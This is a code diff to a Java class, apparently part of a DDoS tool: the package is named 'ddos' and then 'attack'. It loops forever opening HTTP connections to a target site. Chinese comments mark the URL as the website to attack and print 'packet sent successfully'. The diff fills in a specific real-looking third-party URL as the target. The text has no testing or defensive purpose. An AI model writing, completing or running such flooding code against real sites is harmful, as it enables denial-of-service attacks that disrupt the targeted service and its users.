@@ -1,4 +1,4 @@
-package com.ddos.firstknife;
+package com.cyoung.attack.firstknife;
 
 import java.io.BufferedInputStream;
 import java.io.IOException;
@@ -23,7 +23,7 @@ public class Mythread implements Runnable {
         while (true) {
             try {
                 //要攻击的目标网站
-                URL url = new URL("");
+                URL url = new URL("http://www.zhumatech.net/fec/home");
                 URLConnection conn = url.openConnection();
                 System.out.println("发包成功！");
                 BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
